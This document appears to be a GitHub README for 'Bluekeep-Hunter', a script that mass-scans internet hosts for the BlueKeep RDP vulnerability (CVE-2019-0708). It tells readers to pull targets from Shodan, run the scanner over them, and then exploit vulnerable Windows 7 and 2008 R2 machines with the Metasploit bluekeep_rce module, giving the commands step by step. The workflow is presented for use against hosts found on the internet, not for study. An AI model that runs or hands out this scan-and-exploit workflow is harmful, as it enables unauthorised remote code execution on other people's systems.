# Bluekeep-Hunter
CVE-2019-0708

This uses metasploit module in order to scan and check if CVE-2019-0708 exists or not.
The objective of this exploit is to mass hunt for Bluekeep vulnerabilities. This can be done via shodan https://www.shodan.io/search?query=vuln%3ACVE-2019-0708
To obtain the list in linux one can use shodan search vuln:CVE-2019-0708

Install and Usage:

To install clone this repository.

cd Bluekeep-Hunter

chmod +x bluekeephunter.sh

./bluekeephunter.sh targets.txt

Additional: To view usage ./blukeephunter.sh -h

This will scan and give you the vulnerable targets. To exploit:
 Start **msfconsole**
 use exploit/rdp/cve_2019_0708_bluekeep_rce
 set RHOSTS to target hosts (x64 Windows 7 or 2008 R2)
 set PAYLOAD and associated options as desired
 set TARGET to a more specific target based on your environment
 run
 
 **DEMONSTRATION:**
 
 ![FINALDEMOBLUE](https://user-images.githubusercontent.com/48627542/190843346-8a6e5340-e9d6-403c-ace0-337890f4ec05.gif)
